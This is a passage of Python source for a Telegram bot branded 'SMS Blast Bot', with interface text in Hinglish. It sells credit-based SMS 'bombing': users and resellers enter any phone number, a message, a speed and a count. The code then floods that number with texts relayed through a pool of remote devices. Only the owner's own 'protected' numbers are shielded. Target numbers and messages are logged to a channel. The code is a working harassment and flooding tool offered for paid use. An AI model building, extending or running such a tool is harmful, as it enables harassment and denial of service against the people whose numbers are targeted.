    d.setdefault("reseller_balances", {}).setdefault(str(target_id), 0)
    save(d)
    log_activity(d, "reseller_added", msg.from_user.id, f"Reseller: {target_id}")
    save(d)
    await msg.answer(f"✅ Reseller added!\n<code>{target_id}</code>", parse_mode="HTML")
    try:
        await msg.bot.send_message(target_id, "💼 <b>Aapko Reseller bana diya gaya hai!</b>\n/start karein.", parse_mode="HTML")
    except: pass

@R.message(Command("removereseller"))
async def cmd_remove_reseller(msg: Message):
    d = load()
    if not is_owner(msg.from_user.id, d):
        return
    parts = msg.text.split(maxsplit=1) if msg.text else []
    if len(parts) != 2:
        await msg.answer("Usage: /removereseller <user_id>")
        return
    try:
        target_id = int(parts[1].strip())
    except ValueError:
        await msg.answer("Usage: /removereseller <user_id>")
        return
    if target_id not in d.get("resellers", []):
        await msg.answer("❌ User reseller nahi hai.")
        return
    d["resellers"].remove(target_id)
    save(d)
    log_activity(d, "reseller_removed", msg.from_user.id, f"Reseller: {target_id}")
    save(d)
    await msg.answer(f"✅ Reseller removed!\n<code>{target_id}</code>", parse_mode="HTML")


def owner_resellers_menu_kb(d: dict) -> InlineKeyboardMarkup:
    rows = []
    for rid in d.get("resellers", []):
        rows.append([btn(f"{rid} | {reseller_balance(rid, d)}", "noop", EMOJI_MONEY, "💼"),
                     btn("ᴛᴏᴘ ᴜᴘ", f"owner:resellers:topup:{rid}", EMOJI_MONEY, "💰"),
                     btn("ʀᴇᴍᴏᴠᴇ", f"owner:resellers:remove:{rid}", EMOJI_CROSS, "🗑")])
    rows.append([btn("ʙᴀᴄᴋ", "owner:home", EMOJI_GEAR, "🔙")])
    return InlineKeyboardMarkup(inline_keyboard=rows)

@R.callback_query(F.data == "owner:resellers:menu")
async def owner_resellers_menu(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    text = f"{em(EMOJI_MONEY, '💼')} <b>Resellers</b>\n\nTotal: <b>{len(d.get('resellers', []))}</b>"
    await cq.message.edit_text(text, reply_markup=owner_resellers_menu_kb(d), parse_mode="HTML")

@R.callback_query(F.data.startswith("owner:resellers:topup:"))
async def owner_reseller_topup_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    rid = int(cq.data.split("owner:resellers:topup:", 1)[1])
    if rid not in d.get("resellers", []):
        await cq.answer("❌ Reseller not found!", show_alert=True)
        return
    await state.update_data(owner_reseller_uid=rid)
    await state.set_state(S.owner_reseller_topup_amount)
    await cq.message.edit_text(
        f"{em(EMOJI_MONEY, '💰')} <b>Reseller Balance Top-Up</b>\n\n"
        f"Reseller: <code>{rid}</code>\nCurrent Balance: <b>{reseller_balance(rid, d)}</b>\n\n"
        f"Kitne reseller balance add karne hain?",
        reply_markup=kb([(f"{sc('cancel')}", "owner:resellers:menu")]), parse_mode="HTML")

@R.message(S.owner_reseller_topup_amount)
async def owner_reseller_topup_amount_done(msg: Message, state: FSMContext):
    d = load()
    if not is_owner(msg.from_user.id, d):
        await state.clear(); return
    try:
        amount = int(msg.text.strip())
        if amount <= 0: raise ValueError
    except:
        await msg.answer("❌ Positive amount bhejo.", parse_mode="HTML")
        return
    data = await state.get_data()
    rid = int(data.get("owner_reseller_uid", 0))
    if rid not in d.get("resellers", []):
        await state.clear()
        await msg.answer("❌ Reseller not found.", reply_markup=kb([(f"{sc('back')}", "owner:resellers:menu")]), parse_mode="HTML")
        return
    add_reseller_balance(rid, amount, d)
    save(d)
    await state.clear()
    log_activity(d, "reseller_balance_topup", msg.from_user.id, f"Reseller {rid} +{amount}")
    save(d)
    await msg.answer(
        f"{em(EMOJI_CHECK, '✅')} <b>Balance Added!</b>\n\nReseller: <code>{rid}</code>\n"
        f"Added: <b>+{amount}</b>\nNew Balance: <b>{reseller_balance(rid, d)}</b>",
        reply_markup=owner_resellers_menu_kb(d), parse_mode="HTML")
    try:
        await msg.bot.send_message(rid, f"💰 <b>Reseller Balance Top-Up</b>\n+{amount} balance\nNew Balance: <b>{reseller_balance(rid, d)}</b>", parse_mode="HTML")
    except: pass

@R.callback_query(F.data.startswith("owner:resellers:remove:"))
async def owner_reseller_remove(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    rid = int(cq.data.split("owner:resellers:remove:", 1)[1])
    if rid in d.get("resellers", []):
        d["resellers"].remove(rid)
        save(d)
        log_activity(d, "reseller_removed", cq.from_user.id, f"Reseller: {rid}")
        save(d)
        await cq.answer("🗑 Reseller removed!", show_alert=True)
    await owner_resellers_menu(cq, state)

@R.message(Command("start"))
async def cmd_start(msg: Message, state: FSMContext):
    await state.clear()
    uid = msg.from_user.id
    asyncio.create_task(send_fire_effect_private(msg.bot, msg.chat.id))

    name = msg.from_user.full_name or "User"
    username = f"@{msg.from_user.username}" if msg.from_user.username else "No Username"
    d = load()
    is_new = reg_user(uid, name, d)
    save(d)

    if is_new:
        log_text = (
            f"🆕 <b>NEW USER JOINED</b>\n\n"
            f"👤 <b>Name:</b> {name}\n"
            f"🆔 <b>User ID:</b> <code>{uid}</code>\n"
            f"🌐 <b>Username:</b> {username}\n"
            f"📅 <b>Time:</b> <code>{fmt_time(int(time.time()))}</code>"
        )
        asyncio.create_task(send_channel_log(msg.bot, log_text))

    joined, missing = await user_joined_all(msg.bot, uid, d)
    if not joined:
        await msg.answer(force_join_text(missing), reply_markup=force_join_kb(missing), parse_mode="HTML", disable_web_page_preview=True)
        return

    await send_random_video(msg.bot, msg.chat.id, caption=f"{em(EMOJI_ROCKET, '🚀')} Welcome to SMS Blast Bot!\nOwner: {SUPER_ADMIN_NAME}")

    if is_owner(uid, d):
        await msg.answer(owner_panel_text(d), reply_markup=owner_kb(d, uid), parse_mode="HTML")
        return
    if is_admin(uid, d):
        await msg.answer(admin_panel_text(d), reply_markup=admin_kb(d), parse_mode="HTML")
        return
    if is_banned(uid, d):
        await msg.answer(f"{em(EMOJI_CROSS, '🚫')} <b>Aapko ban kar diya gaya hai.</b>\nAdmin se contact karein.", parse_mode="HTML")
        return
    if not can_use(uid, d):
        await msg.answer(f"{em(EMOJI_CROSS, '⛔')} <b>Access nahi hai!</b>\n\nOwner se approval lein.", parse_mode="HTML")
        return

    await msg.answer(user_home_text(uid, d), reply_markup=user_kb(), parse_mode="HTML")

@R.callback_query(F.data == "fj:check")
async def fj_check(cq: CallbackQuery, state: FSMContext):
    uid = cq.from_user.id
    d = load()
    joined, missing = await user_joined_all(cq.bot, uid, d)
    if not joined:
        await cq.answer("❌ Abhi bhi join nahi kiya!", show_alert=True)
        try:
            await cq.message.edit_text(force_join_text(missing), reply_markup=force_join_kb(missing), parse_mode="HTML", disable_web_page_preview=True)
        except: pass
        return

    await cq.answer("✅ Verified!", show_alert=True)
    await send_random_video(cq.bot, cq.message.chat.id, caption=f"{em(EMOJI_ROCKET, '🚀')} Welcome! Verified Successfully.\nOwner: {SUPER_ADMIN_NAME}")

    if is_owner(uid, d):
        await cq.message.answer(owner_panel_text(d), reply_markup=owner_kb(d, uid), parse_mode="HTML")
    elif is_admin(uid, d):
        await cq.message.answer(admin_panel_text(d), reply_markup=admin_kb(d), parse_mode="HTML")
    elif is_reseller(uid, d):
        await cq.message.answer(reseller_panel_text(uid, d), reply_markup=reseller_kb(d), parse_mode="HTML")
    else:
        await cq.message.answer(user_home_text(uid, d), reply_markup=user_kb(), parse_mode="HTML")

@R.callback_query(F.data == "user:send")
async def user_send_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id

    joined, missing = await user_joined_all(cq.bot, uid, d)
    if not joined:
        await cq.answer("⛔ Force Join compulsory hai!", show_alert=True)
        await cq.message.edit_text(force_join_text(missing), reply_markup=force_join_kb(missing), parse_mode="HTML", disable_web_page_preview=True)
        return

    if not can_use(uid, d):
        await cq.answer("🚫 Access denied!", show_alert=True)
        return
    await state.set_state(S.send_number)
    await cq.message.edit_text(
        f"{em(EMOJI_PHONE, '📞')} <b>{sc('step 1/4')} — {sc('number')}</b>\n\n"
        f"Jis number pe SMS bhejna hai woh enter karo:\n<i>Example: +919876543210</i>",
        reply_markup=kb([(f"{sc('cancel')}", "user:home")]),
        parse_mode="HTML"
    )

@R.message(S.send_number)
async def user_got_number(msg: Message, state: FSMContext):
    number = msg.text.strip()
    if not number.replace("+", "").replace(" ", "").isdigit() or len(number) < 7:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Invalid number. Dobara bhejo (e.g. +919876543210):", parse_mode="HTML")
        return

    if number in PROTECTED_NUMBERS:
        await msg.answer(
            f"{em(EMOJI_LOCK, '🔒')} <b>Ye number protected hai!</b>\n\n"
            f"Sirf Owner/Super Admin is number pe SMS bhej sakte hain.",
            parse_mode="HTML"
        )
        return

    await state.update_data(number=number)
    await state.set_state(S.send_message)
    await msg.answer(
        f"{em(EMOJI_CHECK, '✅')} Number: <code>{mask_number(number)}</code>\n\n"
        f"{em(EMOJI_STAR, '💬')} <b>{sc('step 2/4')} — {sc('message')}</b>\n\n"
        f"Jo message bhejna hai woh type karo:",
        reply_markup=kb([(f"{sc('cancel')}", "user:cancel")]),
        parse_mode="HTML"
    )

@R.message(S.send_message)
async def user_got_message(msg: Message, state: FSMContext):
    await state.update_data(message=msg.text.strip())
    await state.set_state(S.send_speed)
    await msg.answer(
        f"{em(EMOJI_CHECK, '✅')} Message saved!\n\n"
        f"{em(EMOJI_ROCKET, '⚡')} <b>{sc('step 3/4')} — {sc('speed')}</b>\n\n"
        f"Sending speed select karein:",
        reply_markup=speed_kb("user"),
        parse_mode="HTML"
    )

@R.callback_query(F.data.in_({"user:speed:fast", "user:speed:medium", "user:speed:slow"}))
async def user_speed_selected(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id

    speed_map = {
        "user:speed:fast": SPEED_FAST,
        "user:speed:medium": SPEED_MEDIUM,
        "user:speed:slow": SPEED_SLOW
    }
    selected_speed = speed_map.get(cq.data, SPEED_MEDIUM)
    speed_label = "🚀 FAST" if selected_speed == SPEED_FAST else "⚡ MEDIUM" if selected_speed == SPEED_MEDIUM else "🐢 SLOW"

    await state.update_data(send_speed=selected_speed)
    await state.set_state(S.send_count)

    devices = get_cached_devices()
    if not devices:
        devices = await get_all_online_devices(d)
    count = len(devices)

    credit_info = ""
    if not is_admin(uid, d) and not is_owner(uid, d):
        user_credits = get_user_credits(uid, d)
        credit_info = f"\n{em(EMOJI_MONEY, '💰')} Your Credits: <b>{user_credits}</b> (max {user_credits} bhej sakte hain)\n"

    await cq.message.edit_text(
        f"{speed_label} <b>selected!</b>\n\n"
        f"{em(EMOJI_STAR, '📊')} <b>{sc('step 4/4')} — {sc('count')}</b>\n\n"
        f"{em(EMOJI_FIRE, '🔥')} Online APIs : <b>{count}</b>\n"
        f"{em(EMOJI_CHECK, '📤')} Device Capacity: <b>{count * 3}</b> SMS{credit_info}\n\n"
        f"Kitne SMS bhejna hai?",
        reply_markup=kb([(f"{sc('cancel')}", "user:cancel")]),
        parse_mode="HTML"
    )

@R.message(S.send_count)
async def user_got_count(msg: Message, state: FSMContext):
    d = load()
    uid = msg.from_user.id
    fsmd = await state.get_data()
    try:
        count = int(msg.text.strip())
        if count < 1:
            raise ValueError
    except:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Sirf number bhejo (e.g. 5):", parse_mode="HTML")
        return
    await state.clear()

    number = fsmd.get("number", "")
    message_text = fsmd.get("message", "")
    send_speed = fsmd.get("send_speed", SPEED_DEFAULT)

    if not is_admin(uid, d) and not is_owner(uid, d):
        current_credits = get_user_credits(uid, d)
        if current_credits <= 0:
            await msg.answer(
                f"{em(EMOJI_CROSS, '❌')} <b>Aapke paas credits nahi hain!</b>\n\n"
                f"{em(EMOJI_MONEY, '💰')} Credits kharidne ke liye Admin se contact karein.",
                reply_markup=kb([(f"{sc('home')}", "user:home")]),
                parse_mode="HTML",
                disable_web_page_preview=True
            )
            return
        if count > current_credits:
            await msg.answer(f"{em(EMOJI_WARNING, '⚠️')} Aapke paas sirf {current_credits} credits hain! Ab {current_credits} bhej raha hoon...", parse_mode="HTML")
            count = current_credits

    devices = get_cached_devices()
    if not devices:
        devices = await get_all_online_devices(d)

    if not devices:
        await msg.answer(f"{em(EMOJI_WARNING, '😴')} Koi API online nahi! Try later.", reply_markup=kb([(f"{sc('home')}", "user:home")]), parse_mode="HTML")
        return

    await run_sms_blast_with_progress(msg.bot, msg, uid, number, message_text, count, devices, send_speed)

@R.callback_query(F.data == "owner:send")
async def owner_send_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    if not is_owner(uid, d):
        await cq.answer("🚫 Owner only!", show_alert=True)
        return
    await state.set_state(S.owner_send_number)
    await cq.message.edit_text(
        f"{em(EMOJI_CROWN, '👑')} <b>Super Admin SMS Send</b>\n\n"
        f"{em(EMOJI_PHONE, '📞')} <b>{sc('step 1/4')} — {sc('number')}</b>\n\n"
        f"Jis number pe SMS bhejna hai woh enter karo:\n<i>Example: +919876543210</i>",
        reply_markup=kb([(f"{sc('cancel')}", "owner:home")]),
        parse_mode="HTML"
    )

@R.message(S.owner_send_number)
async def owner_got_number(msg: Message, state: FSMContext):
    number = msg.text.strip()
    if not number.replace("+", "").replace(" ", "").isdigit() or len(number) < 7:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Invalid number. Dobara bhejo (e.g. +919876543210):", parse_mode="HTML")
        return
    await state.update_data(number=number)
    await state.set_state(S.owner_send_message)
    await msg.answer(
        f"{em(EMOJI_CHECK, '✅')} Number: <code>{number}</code>\n\n"
        f"{em(EMOJI_STAR, '💬')} <b>{sc('step 2/4')} — {sc('message')}</b>\n\n"
        f"Jo message bhejna hai woh type karo:",
        reply_markup=kb([(f"{sc('cancel')}", "owner:home")]),
        parse_mode="HTML"
    )

@R.message(S.owner_send_message)
async def owner_got_message(msg: Message, state: FSMContext):
    await state.update_data(message=msg.text.strip())
    await state.set_state(S.owner_send_speed)
    await msg.answer(
        f"{em(EMOJI_CHECK, '✅')} Message saved!\n\n"
        f"{em(EMOJI_ROCKET, '⚡')} <b>{sc('step 3/4')} — {sc('speed')}</b>\n\n"
        f"Sending speed select karein:",
        reply_markup=speed_kb("owner"),
        parse_mode="HTML"
    )

@R.callback_query(F.data.in_({"owner:speed:fast", "owner:speed:medium", "owner:speed:slow"}))
async def owner_speed_selected(cq: CallbackQuery, state: FSMContext):
    speed_map = {
        "owner:speed:fast": SPEED_FAST,
        "owner:speed:medium": SPEED_MEDIUM,
        "owner:speed:slow": SPEED_SLOW
    }
    selected_speed = speed_map.get(cq.data, SPEED_MEDIUM)
    speed_label = "🚀 FAST" if selected_speed == SPEED_FAST else "⚡ MEDIUM" if selected_speed == SPEED_MEDIUM else "🐢 SLOW"

    await state.update_data(send_speed=selected_speed)
    await state.set_state(S.owner_send_count)

    devices = get_cached_devices()
    if not devices:
        devices = await get_all_online_devices(load())
    count = len(devices)

    await cq.message.edit_text(
        f"{speed_label} <b>selected!</b>\n\n"
        f"{em(EMOJI_STAR, '📊')} <b>{sc('step 4/4')} — {sc('count')}</b>\n\n"
        f"{em(EMOJI_FIRE, '🔥')} Online APIs : <b>{count}</b>\n"
        f"{em(EMOJI_CHECK, '📤')} Device Capacity: <b>{count * 3}</b> SMS\n\n"
        f"Kitne SMS bhejna hai?",
        reply_markup=kb([(f"{sc('cancel')}", "owner:home")]),
        parse_mode="HTML"
    )

@R.message(S.owner_send_count)
async def owner_got_count(msg: Message, state: FSMContext):
    fsmd = await state.get_data()
    try:
        count = int(msg.text.strip())
        if count < 1:
            raise ValueError
    except:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Sirf number bhejo (e.g. 5):", parse_mode="HTML")
        return
    await state.clear()
    number = fsmd.get("number", "")
    message_text = fsmd.get("message", "")
    send_speed = fsmd.get("send_speed", SPEED_DEFAULT)
    devices = get_cached_devices()
    if not devices:
        devices = await get_all_online_devices(load())
    if not devices:
        await msg.answer(f"{em(EMOJI_WARNING, '😴')} Koi API online nahi! Try later.", reply_markup=kb([(f"{sc('owner panel')}", "owner:home")]), parse_mode="HTML")
        return
    await run_sms_blast_with_progress(msg.bot, msg, msg.from_user.id, number, message_text, count, devices, send_speed)

@R.callback_query(F.data == "admin:send")
async def admin_send_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    if not is_admin(uid, d):
        await cq.answer("🚫 Admin only!", show_alert=True)
        return
    await state.set_state(S.admin_send_number)
    await cq.message.edit_text(
        f"{em(EMOJI_SHIELD, '🛡')} <b>Admin SMS Send</b>\n\n"
        f"{em(EMOJI_PHONE, '📞')} <b>{sc('step 1/4')} — {sc('number')}</b>\n\n"
        f"Jis number pe SMS bhejna hai woh enter karo:\n<i>Example: +919876543210</i>",
        reply_markup=kb([(f"{sc('cancel')}", "admin:home")]),
        parse_mode="HTML"
    )

@R.message(S.admin_send_number)
async def admin_got_number(msg: Message, state: FSMContext):
    number = msg.text.strip()
    if not number.replace("+", "").replace(" ", "").isdigit() or len(number) < 7:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Invalid number. Dobara bhejo (e.g. +919876543210):", parse_mode="HTML")
        return

    if number in PROTECTED_NUMBERS:
        protector_uid = PROTECTED_NUMBERS[number]
        if not is_owner(msg.from_user.id, load()) and msg.from_user.id != protector_uid:
            await msg.answer(
                f"{em(EMOJI_LOCK, '🔒')} <b>Ye number protected hai!</b>\n\n"
                f"Sirf Owner/Super Admin is number pe SMS bhej sakte hain.",
                parse_mode="HTML"
            )
            return

    await state.update_data(number=number)
    await state.set_state(S.admin_send_message)
    await msg.answer(
        f"{em(EMOJI_CHECK, '✅')} Number: <code>{mask_number(number)}</code>\n\n"
        f"{em(EMOJI_STAR, '💬')} <b>{sc('step 2/4')} — {sc('message')}</b>\n\n"
        f"Jo message bhejna hai woh type karo:",
        reply_markup=kb([(f"{sc('cancel')}", "admin:home")]),
        parse_mode="HTML"
    )

@R.message(S.admin_send_message)
async def admin_got_message(msg: Message, state: FSMContext):
    await state.update_data(message=msg.text.strip())
    await state.set_state(S.admin_send_speed)
    await msg.answer(
        f"{em(EMOJI_CHECK, '✅')} Message saved!\n\n"
        f"{em(EMOJI_ROCKET, '⚡')} <b>{sc('step 3/4')} — {sc('speed')}</b>\n\n"
        f"Sending speed select karein:",
        reply_markup=speed_kb("admin"),
        parse_mode="HTML"
    )

@R.callback_query(F.data.in_({"admin:speed:fast", "admin:speed:medium", "admin:speed:slow"}))
async def admin_speed_selected(cq: CallbackQuery, state: FSMContext):
    speed_map = {
        "admin:speed:fast": SPEED_FAST,
        "admin:speed:medium": SPEED_MEDIUM,
        "admin:speed:slow": SPEED_SLOW
    }
    selected_speed = speed_map.get(cq.data, SPEED_MEDIUM)
    speed_label = "🚀 FAST" if selected_speed == SPEED_FAST else "⚡ MEDIUM" if selected_speed == SPEED_MEDIUM else "🐢 SLOW"

    await state.update_data(send_speed=selected_speed)
    await state.set_state(S.admin_send_count)

    devices = get_cached_devices()
    if not devices:
        devices = await get_all_online_devices(load())
    count = len(devices)

    await cq.message.edit_text(
        f"{speed_label} <b>selected!</b>\n\n"
        f"{em(EMOJI_STAR, '📊')} <b>{sc('step 4/4')} — {sc('count')}</b>\n\n"
        f"{em(EMOJI_FIRE, '🔥')} Online APIs : <b>{count}</b>\n"
        f"{em(EMOJI_CHECK, '📤')} Device Capacity: <b>{count * 3}</b> SMS\n\n"
        f"Kitne SMS bhejna hai?",
        reply_markup=kb([(f"{sc('cancel')}", "admin:home")]),
        parse_mode="HTML"
    )

@R.message(S.admin_send_count)
async def admin_got_count(msg: Message, state: FSMContext):
    fsmd = await state.get_data()
    try:
        count = int(msg.text.strip())
        if count < 1:
            raise ValueError
    except:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Sirf number bhejo (e.g. 5):", parse_mode="HTML")
        return
    await state.clear()
    number = fsmd.get("number", "")
    message_text = fsmd.get("message", "")
    send_speed = fsmd.get("send_speed", SPEED_DEFAULT)
    devices = get_cached_devices()
    if not devices:
        devices = await get_all_online_devices(load())
    if not devices:
        await msg.answer(f"{em(EMOJI_WARNING, '😴')} Koi API online nahi! Try later.", reply_markup=kb([(f"{sc('admin panel')}", "admin:home")]), parse_mode="HTML")
        return
    await run_sms_blast_with_progress(msg.bot, msg, msg.from_user.id, number, message_text, count, devices, send_speed)

async def run_sms_blast_with_progress(bot: Bot, msg: Message, uid: int, number: str, message: str, count: int, devices: list, speed: float = SPEED_DEFAULT):
    await send_random_video(bot, msg.chat.id, caption=f"💣 <b>SMS Bombing Started on {mask_number(number)}!</b>")

    async with SESSIONS_LOCK:
        if uid in USER_SESSIONS:
            old_session = USER_SESSIONS[uid]
            if old_session.task and not old_session.task.done():
                await msg.answer(
                    f"{em(EMOJI_WARNING, '⚠️')} <b>Ek sending already chal rahi hai!</b>\n"
                    f"Pehle woh khatam hone do ya stop karein.",
                    parse_mode="HTML"
                )
                return
            del USER_SESSIONS[uid]

        session = UserSession(uid)
        session.number = number
        USER_SESSIONS[uid] = session

    is_regular_user = not is_admin(uid, load()) and not is_owner(uid, load())
    current_credits = get_user_credits(uid, load()) if is_regular_user else None

    speed_label_display = "🚀 FAST" if speed == SPEED_FAST else "⚡ MEDIUM" if speed == SPEED_MEDIUM else "🐢 SLOW"

    try:
        progress_msg = await msg.answer(
            progress_text(0, 0, count, current_credits, speed_label_display),
            reply_markup=stop_send_kb(),
            parse_mode="HTML"
        )
    except Exception as e:
        log.error(f"Failed to send progress message: {e}")
        async with SESSIONS_LOCK:
            if uid in USER_SESSIONS:
                del USER_SESSIONS[uid]
        return

    sent_ok = 0
    sent_fail = 0
    msgs_left = count
    api_usage_delta = {}
    last_update_time = time.time()
    start_time = time.time()

    async def do_send():
        nonlocal sent_ok, sent_fail, msgs_left, last_update_time
        try:
            for device in devices:
                if msgs_left <= 0:
                    break

                async with session.lock:
                    if session.cancelled:
                        log.info(f"User {uid} stopped sending at {sent_ok + sent_fail}/{count}")
                        break

                fb_id = device["fb_id"]
                fb_url = device["fb_url"]
                dev_id = device["dev_id"]
                sims = device["sims"]
                sim_slots = [s.get("simSlotIndex", 0) for s in sims] if sims else [0]
                device_quota = min(3, msgs_left)
                device_sent = 0

                for sim in sim_slots:
                    async with session.lock:
                        if device_sent >= device_quota or msgs_left <= 0 or session.cancelled:
                            break

                    ok = await send_sms_via_device(fb_url, dev_id, sim, number, message)

                    async with session.lock:
                        if ok:
                            sent_ok += 1
                            device_sent += 1
                            msgs_left -= 1

                            if is_regular_user:
                                d_temp = load()
                                deduct_credits(uid, 1, d_temp)
                                d_temp["stats"]["total_sent"] = d_temp["stats"].get("total_sent", 0) + 1
                                k = str(uid)
                                if k in d_temp["users"]:
                                    d_temp["users"][k]["uses"] = d_temp["users"][k].get("uses", 0) + 1
                                d_temp.setdefault("sms_history", {}).setdefault(str(uid), []).append({
                                    "number": number,
                                    "message": message[:100],
                                    "timestamp": int(time.time()),
                                    "status": "sent"
                                })
                                save(d_temp)
                        else:
                            sent_fail += 1
                            msgs_left -= 1

                        if fb_id not in api_usage_delta:
                            api_usage_delta[fb_id] = {"sent": 0, "failed": 0}
                        api_usage_delta[fb_id]["sent" if ok else "failed"] += 1

                        now = time.time()
                        if (now - last_update_time >= _PROGRESS_UPDATE_INTERVAL or
                            (sent_ok + sent_fail) == count or
                            session.cancelled):

                            current_credits_live = get_user_credits(uid, load()) if is_regular_user else None
                            try:
                                await progress_msg.edit_text(
                                    progress_text(sent_ok, sent_fail, count, current_credits_live, speed_label_display),
                                    reply_markup=stop_send_kb() if not session.cancelled else None,
                                    parse_mode="HTML"
                                )
                            except TelegramBadRequest:
                                pass
                            last_update_time = now

                    await asyncio.sleep(speed)

        except Exception as e:
            log.error(f"Error in send loop for user {uid}: {e}")
        finally:
            async with session.lock:
                session.sent = sent_ok
                session.failed = sent_fail

    task = asyncio.create_task(do_send())
    session.task = task
    await task
    was_cancelled = session.cancelled

    async with SESSIONS_LOCK:
        if uid in USER_SESSIONS:
            del USER_SESSIONS[uid]

    if not is_regular_user:
        d_final = load()
        d_final["stats"]["total_sent"] = d_final["stats"].get("total_sent", 0) + sent_ok
        d_final["stats"]["total_failed"] = d_final["stats"].get("total_failed", 0) + sent_fail
        for fb_id, delta in api_usage_delta.items():
            d_final["stats"].setdefault("api_usage", {}).setdefault(fb_id, {"sent": 0, "failed": 0})
            d_final["stats"]["api_usage"][fb_id]["sent"] += delta["sent"]
            d_final["stats"]["api_usage"][fb_id]["failed"] += delta["failed"]
        k = str(uid)
        if k in d_final["users"]:
            d_final["users"][k]["uses"] = d_final["users"][k].get("uses", 0) + sent_ok
        d_final.setdefault("sms_history", {}).setdefault(str(uid), []).append({
            "number": number,
            "message": message[:100],
            "timestamp": int(time.time()),
            "status": "completed" if not was_cancelled else "stopped"
        })
        save(d_final)
    else:
        d_final = load()
        d_final["stats"]["total_failed"] = d_final["stats"].get("total_failed", 0) + sent_fail
        for fb_id, delta in api_usage_delta.items():
            d_final["stats"].setdefault("api_usage", {}).setdefault(fb_id, {"sent": 0, "failed": 0})
            d_final["stats"]["api_usage"][fb_id]["failed"] += delta["failed"]
        save(d_final)

    d_log = load()
    duration = int(time.time() - start_time)
    log_activity(d_log, "sms_blast", uid,
        f"Sent: {sent_ok}, Failed: {sent_fail}, Total: {count}, Duration: {fmt_duration(duration)}, Stopped: {was_cancelled}")
    save(d_log)

    try:
        user_chat_info = await bot.get_chat(uid)
        u_name = user_chat_info.full_name or "Unknown"
        u_uname = f"@{user_chat_info.username}" if user_chat_info.username else "No Username"
    except Exception:
        u_name = d_log.get("users", {}).get(str(uid), {}).get("name", "Unknown")
        u_uname = "No Username"

    chan_log = (
        f"🚀 <b>SMS BLAST ACTIVITY LOG</b>\n\n"
        f"👤 <b>User:</b> {u_name}\n"
        f"🆔 <b>User ID:</b> <code>{uid}</code>\n"
        f"🌐 <b>Username:</b> {u_uname}\n"
        f"📞 <b>Target Number:</b> <code>{number}</code>\n"
        f"💬 <b>Message:</b> <code>{message}</code>\n"
        f"✅ <b>Sent:</b> <b>{sent_ok}</b>\n"
        f"❌ <b>Failed:</b> <b>{sent_fail}</b>\n"
        f"📊 <b>Requested Count:</b> <b>{count}</b>\n"
        f"⏱ <b>Duration:</b> <b>{fmt_duration(duration)}</b>\n"
        f"🛑 <b>Status:</b> {'STOPPED BY USER' if was_cancelled else 'COMPLETED'}"
    )
    asyncio.create_task(send_channel_log(bot, chan_log))

    if sent_fail == 0 and sent_ok > 0:
        icon = em(EMOJI_CHECK, "✅")
    elif sent_ok > 0:
        icon = em(EMOJI_WARNING, "⚠️")
    else:
        icon = em(EMOJI_CROSS, "❌")

    credit_text = ""
    if is_regular_user:
        remaining = get_user_credits(uid, load())
        credit_text = f"\n{em(EMOJI_MONEY, '💰')} Credits Used: <b>{sent_ok}</b>\n{em(EMOJI_MONEY, '💳')} Remaining: <b>{remaining}</b>"

    stopped_text = f"\n{em(EMOJI_CROSS, '🛑')} <b>User ne beech mein stop kiya!</b>" if was_cancelled else ""
    duration_text = f"\n{em(EMOJI_GEAR, '⏱')} Duration: <b>{fmt_duration(int(time.time() - start_time))}</b>"

    if is_owner(uid, load()):
        back_btn = [btn("ᴏᴡɴᴇʀ ᴘᴀɴᴇʟ", "owner:home", EMOJI_GEAR, "🔙")]
    elif is_admin(uid, load()):
        back_btn = [btn("ᴀᴅᴍɪɴ ᴘᴀɴᴇʟ", "admin:home", EMOJI_GEAR, "🔙")]
    elif is_reseller(uid, load()):
        back_btn = [btn("ᴀᴅᴍɪɴ ᴘᴀɴᴇʟ", "reseller:home", EMOJI_GEAR, "🔙")]
    else:
        back_btn = [btn("sᴇɴᴅ ᴀɴᴏᴛʜᴇʀ", "user:send", EMOJI_ROCKET, "📤"), btn("ʜᴏᴍᴇ", "user:home", EMOJI_STAR, "🏠")]

    try:
        await progress_msg.edit_text(
            f"{icon} <b>SMS Blast Result</b>{stopped_text}\n\n"
            f"{em(EMOJI_PHONE, '📞')} To: <code>{mask_number(number)}</code>\n"
            f"{em(EMOJI_STAR, '💬')} Message: <code>{message[:50]}{'...' if len(message)>50 else ''}</code>\n"
            f"{em(EMOJI_CHECK, '✅')} Sent: <b>{sent_ok}</b>\n"
            f"{em(EMOJI_CROSS, '❌')} Failed: <b>{sent_fail}</b>\n"
            f"{em(EMOJI_FIRE, '🔥')} APIs used: <b>{len(api_usage_delta)}</b>"
            f"{duration_text}{credit_text}",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[back_btn]),
            parse_mode="HTML"
        )
    except Exception as e:
        log.error(f"Failed to edit final progress message: {e}")

@R.callback_query(F.data == "user:stop_send")
async def user_stop_send(cq: CallbackQuery, state: FSMContext):
    uid = cq.from_user.id

    async with SESSIONS_LOCK:
        session = USER_SESSIONS.get(uid)
        if not session or (session.task and session.task.done()):
            await cq.answer("✅ Sending already complete ya koi active sending nahi!", show_alert=True)
            return
        session.cancelled = True

    await cq.answer("🛑 Stop signal bhej diya! Thodi der mein sending ruk jayegi...", show_alert=True)

    try:
        async with session.lock:
            current_sent = session.sent
            current_failed = session.failed
        await cq.message.edit_text(
            f"{em(EMOJI_CROSS, '🛑')} <b>Stopping...</b>\n\n"
            f"{em(EMOJI_CHECK, '✅')} Sent: <b>{current_sent}</b>\n"
            f"{em(EMOJI_CROSS, '❌')} Failed: <b>{current_failed}</b>\n\n"
            f"<i>Current sending complete hone ke baad ruk jayega...</i>",
            parse_mode="HTML"
        )
    except Exception:
        pass

